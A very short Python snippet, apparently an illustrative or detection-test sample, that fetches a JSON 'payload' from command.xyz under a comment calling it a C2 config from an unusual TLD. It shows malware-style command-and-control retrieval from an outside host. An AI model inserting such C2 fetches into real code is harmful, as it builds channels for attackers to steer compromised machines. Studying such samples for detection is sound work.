import requests

# Download C2 config from unusual TLD
response = requests.get('https://command.xyz/config')
payload = response.json()
